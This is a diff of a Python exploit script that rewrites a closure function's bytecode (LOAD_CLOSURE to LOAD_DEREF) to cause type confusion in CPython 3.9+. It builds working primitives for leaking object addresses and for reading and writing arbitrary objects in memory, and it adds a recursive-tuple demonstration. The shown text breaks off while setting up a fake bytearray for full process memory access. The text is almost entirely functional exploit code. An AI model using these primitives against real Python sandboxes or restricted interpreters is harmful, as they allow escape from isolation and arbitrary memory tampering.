@@ -2,7 +2,7 @@
 # *(object + 2 * sizeof(c_void_p)) = n
 # WARNING: python3 calls `Py_INCREF` and `Py_XDECREF` on passed in and replaced object respectively
 
-# the following code exploits an optimzation in cpython 3.9 bytecode
+# the following code exploits an optimzation in cpython 3.9+ bytecode
 # by replacing the opcode `LOAD_CLOSURE` (0x87) with `LOAD_DEREF` (0x88)
 # this means that python will instead load the value of the closure instead of the closure itself
 # it is possible to construct a python function that has an arbitrary object
@@ -44,14 +44,18 @@
 #     DISPATCH();
 # }
 
-def gadget(n):
-    def f(*v):
-        nonlocal n
-        if v:
-            n = v[0]
-        else:
-            return n
-    return f
+def gadget(magic):
+    def hack():
+        def get():
+            return magic
+        def set(*value):
+            nonlocal magic
+            if value:
+                magic = value[0]
+            else:
+                del magic
+        return get, set
+    return hack()
 
 C = gadget.__code__
 gadget.__code__ = C.replace(
@@ -68,29 +72,41 @@ def cast(v, t1, t2, bufsize=tuple.__itemsize__):
 
 def set_obj_at_addr(addr, obj):
     # uses `complex` to build a list-like structure
-    gadget(list.__setitem__)(complex)
+    g, s = gadget(list.__setitem__)
+    s(complex)
     list.__setitem__(complex(
         cast(1, 'l', 'd'),
         cast(addr, 'l', 'd')
     ), 0, obj)
-    gadget(list.__setitem__)(list)
+    s(list)
 
 def get_obj_at_addr(addr):
     # uses `float` as a cell-like structure
-    return gadget(cast(addr, 'l', 'd'))()
+    g, s = gadget(cast(addr, 'l', 'd'))
+    return g()
 
 def addressof(obj):
     # uses `float` as a cell-like structure
     r = 0.0
-    gadget(r)(obj)
-    return cast(r, 'd', 'l')
+    g, s = gadget(r)
+    s(obj)
+    try:
+        return cast(r, 'd', 'l')
+    finally:
+        s()
 
 # from here you can get full python process memory r/w
 # by constructing a fake bytearray that points from 0 to 2**63-1 and using `get_obj_at_addr`
 # to load it. subsequent `fake_bytearray[addr]` will be able to read and write single bytes
 # you can also write to a slice `fake_bytearray[addr: addr + size]` to write `size` bytes at once
 
-# example:
+# construct recursive tuple without full memory access
+x = (0,)
+print(x)
+set_obj_at_addr(addressof(x) + tuple.__basicsize__, x)
+print(x)
+
+# example of full memory access:
 memory_backing = bytes(8) \
                + addressof(bytearray).to_bytes(8, 'little') \
                + bytes([255] * (7) + [127]) \
